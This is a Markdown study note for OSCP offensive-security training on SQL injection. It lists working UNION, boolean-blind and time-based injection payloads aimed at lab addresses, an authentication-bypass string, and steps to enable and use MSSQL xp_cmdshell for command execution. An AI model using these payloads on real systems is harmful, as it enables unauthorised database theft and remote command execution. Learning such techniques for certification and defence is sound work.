---
aliases:
  - SQL Injection
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - web_application
  - web_app
  - sql_injection
  - sqli
author: Mehdi N Tehrani
creat_date: 2023-12-26
category: Cyber Security
subcategory: Offensive Security - OSCP
---
# SQLi Types
## in-band
#in_band
when the vulnerable application provides the result of the query along with the application-returned value.
if this is the case, we should try UNION payloads to extract data from the db.
### Example
PHP code:
```php
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```
Attack:
```mysql
# To find out how many columns are being returned:
' ORDER BY 1-- //

# if 4 cols being returned, try to find out which are displayed
%' UNION SELECT database(), user(), @@version, null, null -- //

# get database, user accessing db for the app, and db version
' UNION SELECT null, null, database(), user(), @@version  -- //

# get table, columns, database name (table_schema)
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

#### Reference
[MySQL Information Schema](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html)
#mysql #information_schema

## Blind
Nothing gets displayed on the web app, but we need to infer from the results coming from the SQLi e.g. and error occurring or not, etc.
### boolean-based
#boolean_based
test for boolean-based SQLi:
```
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```

### time-based
#time_based
test for time-based SQLi
```
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

# Payload types
- Union
- Error
- Blind
# MySQL
#mysql
## PHP
#php
```
user' OR 1=1 -- //
```


# MSSQL
#mssql #xp_cmdshell
Connect to MSSQL using *impacke-mssqlclient*
```
impacket-mssqlclient <user>:<pass>@<ip> -windows-auth
```

Enable *xp_cmdshell*:
```mssql
EXECUTE sp_configure 'show advanced options',1;
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell',1;
RECONFIGURE
```

Use *xp_cmdshell*:
```impacket-mssqlclient
> EXECUTE xp_cmdshell <command>

> execute xp_cmdshell 'whoami'
output                        
---------------------------   
nt service\mssql$sqlexpress   

NULL     
```

